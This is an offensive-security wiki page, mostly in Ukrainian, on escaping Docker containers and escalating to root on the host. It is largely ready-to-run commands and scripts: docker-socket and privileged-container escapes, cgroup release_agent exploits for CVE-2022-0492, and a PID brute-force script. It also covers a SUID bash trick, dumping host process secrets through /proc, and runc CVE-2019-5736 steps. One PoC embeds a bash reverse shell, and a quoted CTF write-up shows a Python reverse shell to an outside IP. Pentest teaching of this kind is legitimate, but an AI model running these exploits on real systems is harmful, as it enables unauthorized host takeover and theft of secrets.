# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Автоматична енумерація та втеча

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Він також може **енумерувати контейнери**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Цей інструмент досить **корисний для енумерації контейнера, в якому ви знаходитесь, навіть намагаючись втекти автоматично**
- [**amicontained**](https://github.com/genuinetools/amicontained): Корисний інструмент для отримання привілеїв, які має контейнер, щоб знайти способи втечі з нього
- [**deepce**](https://github.com/stealthcopter/deepce): Інструмент для енумерації та втечі з контейнерів
- [**grype**](https://github.com/anchore/grype): Отримати CVE, що містяться в програмному забезпеченні, встановленому в образі

## Втеча з змонтованого сокета Docker

Якщо ви якимось чином виявите, що **сокет docker змонтовано** всередині контейнера docker, ви зможете втекти з нього.\
Це зазвичай трапляється в контейнерах docker, які з якоїсь причини потребують підключення до демона docker для виконання дій.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
У цьому випадку ви можете використовувати звичайні команди docker для зв'язку з демоном docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> У випадку, якщо **docker socket знаходиться в несподіваному місці**, ви все ще можете взаємодіяти з ним, використовуючи команду **`docker`** з параметром **`-H unix:///path/to/docker.sock`**

Docker daemon також може [слухати на порту (за замовчуванням 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) або на системах, що базуються на Systemd, взаємодія з Docker daemon може відбуватися через сокет Systemd `fd://`.

> [!NOTE]
> Додатково зверніть увагу на сокети виконання інших високорівневих середовищ:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Зловживання можливостями

Вам слід перевірити можливості контейнера, якщо він має будь-які з наступних, ви можете мати можливість втекти з нього: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Ви можете перевірити поточні можливості контейнера, використовуючи **раніше згадані автоматичні інструменти** або:
```bash
capsh --print
```
На наступній сторінці ви можете **дізнатися більше про можливості linux** та як їх зловживати для втечі/ескалації привілеїв:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Втеча з привілейованих контейнерів

Привілейований контейнер може бути створений з прапором `--privileged` або шляхом вимкнення певних захистів:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Прапор `--privileged` значно знижує безпеку контейнера, пропонуючи **необмежений доступ до пристроїв** та обходячи **кілька захистів**. Для детального розгляду зверніться до документації про повні наслідки `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Привілейований + hostPID

З цими дозволами ви можете просто **перейти до простору імен процесу, що виконується на хості як root**, наприклад init (pid:1), просто виконавши: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Перевірте це в контейнері, виконавши:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Привілейований

Просто з прапором привілеїв ви можете спробувати **отримати доступ до диска хоста** або спробувати **втекти, зловживаючи release_agent або іншими способами втечі**.

Перевірте наступні обходи в контейнері, виконавши:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Монтування диска - Poc1

Добре налаштовані docker контейнери не дозволять команди на кшталт **fdisk -l**. Однак на неправильно налаштованій docker команді, де вказано прапор `--privileged` або `--device=/dev/sda1` з великими літерами, можливо отримати привілеї для перегляду диска хоста.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Отже, щоб захопити хост-машину, це тривіально:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
І ось! Тепер ви можете отримати доступ до файлової системи хоста, оскільки вона змонтована в папці `/mnt/hola`.

#### Монтування диска - Poc2

Усередині контейнера зловмисник може спробувати отримати подальший доступ до основної ОС хоста через записуваний том hostPath, створений кластером. Нижче наведено деякі загальні речі, які ви можете перевірити в контейнері, щоб дізнатися, чи можете ви скористатися цим вектором атаки:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Привілейоване втеча Зловживання існуючим release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Привілейоване втеча з використанням створеного release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Знайдіть **пояснення техніки** в:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Привілейоване втеча, що використовує release_agent без відомого відносного шляху - PoC3

У попередніх експлойтах **абсолютний шлях контейнера всередині файлової системи хоста розкритий**. Однак це не завжди так. У випадках, коли ви **не знаєте абсолютний шлях контейнера всередині хоста**, ви можете використовувати цю техніку:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Виконання PoC в привілейованому контейнері має надати вихід, подібний до:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Привілейоване Втеча Зловживанням Чутливими Монтуваннями

Є кілька файлів, які можуть бути змонтовані, що надають **інформацію про основний хост**. Деякі з них можуть навіть вказувати **щось, що має бути виконано хостом, коли щось трапляється** (що дозволить зловмиснику втекти з контейнера).\
Зловживання цими файлами може дозволити:

- release_agent (вже розглянуто раніше)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Однак ви можете знайти **інші чутливі файли**, які слід перевірити на цій сторінці:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Произвольні Монтування

В кількох випадках ви виявите, що **контейнер має деякий об'єм, змонтований з хоста**. Якщо цей об'єм не був правильно налаштований, ви можете мати можливість **доступу/зміни чутливих даних**: Читати секрети, змінювати ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Підвищення привілеїв з 2 оболонками та монтуванням хоста

Якщо у вас є доступ як **root всередині контейнера**, який має деяку папку з хоста, що змонтована, і ви **втекли як неприprivileged користувач до хоста** та маєте доступ для читання до змонтованої папки.\
Ви можете створити **bash suid файл** у **змонтованій папці** всередині **контейнера** та **виконати його з хоста** для підвищення привілеїв.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Підвищення привілеїв з 2 оболонками

Якщо у вас є доступ як **root всередині контейнера** і ви **втекли як неприваблений користувач на хост**, ви можете зловживати обома оболонками для **підвищення привілеїв всередині хоста**, якщо у вас є можливість MKNOD всередині контейнера (це за замовчуванням) як [**пояснено в цьому пості**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
З такою можливістю користувач root всередині контейнера може **створювати файли блочного пристрою**. Файли пристроїв - це спеціальні файли, які використовуються для **доступу до базового апаратного забезпечення та модулів ядра**. Наприклад, файл блочного пристрою /dev/sda надає доступ до **читання сирих даних на диску системи**.

Docker захищає від зловживання файлами блочного пристрою всередині контейнерів, застосовуючи політику cgroup, яка **блокує операції читання/запису блочних пристроїв**. Проте, якщо файл блочного пристрою **створено всередині контейнера**, він стає доступним ззовні контейнера через директорію **/proc/PID/root/**. Цей доступ вимагає, щоб **власник процесу був однаковим** як всередині, так і зовні контейнера.

**Приклад експлуатації** з цього [**опису**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Якщо ви можете отримати доступ до процесів хоста, ви зможете отримати доступ до великої кількості чутливої інформації, що зберігається в цих процесах. Запустіть тестову лабораторію:
```
docker run --rm -it --pid=host ubuntu bash
```
Наприклад, ви зможете перерахувати процеси, використовуючи щось на кшталт `ps auxn` і шукати чутливі дані в командах.

Тоді, оскільки ви можете **доступитися до кожного процесу хоста в /proc/ ви просто можете вкрасти їхні секрети середовища**, запустивши:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Ви також можете **отримати доступ до дескрипторів файлів інших процесів і читати їх відкриті файли**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Ви також можете **вбивати процеси і викликати DoS**.

> [!WARNING]
> Якщо у вас якимось чином є привілейований **доступ до процесу поза контейнером**, ви можете запустити щось на зразок `nsenter --target <pid> --all` або `nsenter --target <pid> --mount --net --pid --cgroup`, щоб **запустити оболонку з тими ж обмеженнями ns** (сподіваємось, жодними) **як у цього процесу.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Якщо контейнер був налаштований з Docker [драйвером мережевого хосту (`--network=host`)](https://docs.docker.com/network/host/), стек мережі цього контейнера не ізольований від Docker хосту (контейнер ділить простір імен мережі хосту), і контейнер не отримує свою власну IP-адресу. Іншими словами, **контейнер прив'язує всі сервіси безпосередньо до IP-адреси хосту**. Крім того, контейнер може **перехоплювати ВСІ мережеві дані, які хост** надсилає та отримує на спільному інтерфейсі `tcpdump -i eth0`.

Наприклад, ви можете використовувати це для **перехоплення та навіть підробки трафіку** між хостом і екземпляром метаданих.

Як у наступних прикладах:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Ви також зможете отримати доступ до **мережевих сервісів, прив'язаних до localhost** всередині хосту або навіть отримати доступ до **дозволів метаданих вузла** (які можуть відрізнятися від тих, до яких може отримати доступ контейнер).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
З `hostIPC=true` ви отримуєте доступ до ресурсів міжпроцесного спілкування (IPC) хоста, таких як **спільна пам'ять** у `/dev/shm`. Це дозволяє читати/писати, де ті ж ресурси IPC використовуються іншими процесами хоста або пода. Використовуйте `ipcs`, щоб детальніше перевірити ці механізми IPC.

- **Перевірте /dev/shm** - Шукайте будь-які файли в цьому місці спільної пам'яті: `ls -la /dev/shm`
- **Перевірте існуючі засоби IPC** – Ви можете перевірити, чи використовуються якісь засоби IPC за допомогою `/usr/bin/ipcs`. Перевірте це за допомогою: `ipcs -a`

### Відновлення можливостей

Якщо системний виклик **`unshare`** не заборонений, ви можете відновити всі можливості, запустивши:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Зловживання простором імен користувача через symlink

Друга техніка, описана в пості [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/), вказує, як можна зловживати прив'язками з просторами імен користувача, щоб впливати на файли всередині хоста (в цьому конкретному випадку, видаляти файли).

## CVE

### Вразливість Runc (CVE-2019-5736)

У випадку, якщо ви можете виконати `docker exec` як root (ймовірно, з sudo), ви намагаєтеся підвищити привілеї, втікаючи з контейнера, зловживаючи CVE-2019-5736 (експлойт [тут](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ця техніка в основному **перезаписує** бінарний файл _**/bin/sh**_ **хоста** **з контейнера**, тому будь-хто, хто виконує docker exec, може активувати payload.

Змініть payload відповідно і зберіть main.go за допомогою `go build main.go`. Отриманий бінарний файл слід помістити в контейнер Docker для виконання.\
Після виконання, як тільки з'явиться повідомлення `[+] Overwritten /bin/sh successfully`, вам потрібно виконати наступне з хост-машини:

`docker exec -it <container-name> /bin/sh`

Це активує payload, який присутній у файлі main.go.

Для отримання додаткової інформації: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Існують інші CVE, до яких контейнер може бути вразливим, ви можете знайти список за адресою [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Спеціальне втеча Docker

### Поверхня втечі Docker

- **Простори імен:** Процес повинен бути **повністю відокремлений від інших процесів** через простори імен, тому ми не можемо втекти, взаємодіючи з іншими процесами через простори імен (за замовчуванням не можуть спілкуватися через IPC, unix-сокети, мережеві сервіси, D-Bus, `/proc` інших процесів).
- **Користувач root**: За замовчуванням користувач, що виконує процес, є користувачем root (однак його привілеї обмежені).
- **Можливості**: Docker залишає такі можливості: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Системні виклики**: Це системні виклики, які **користувач root не зможе викликати** (через відсутність можливостей + Seccomp). Інші системні виклики можуть бути використані для спроби втечі.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
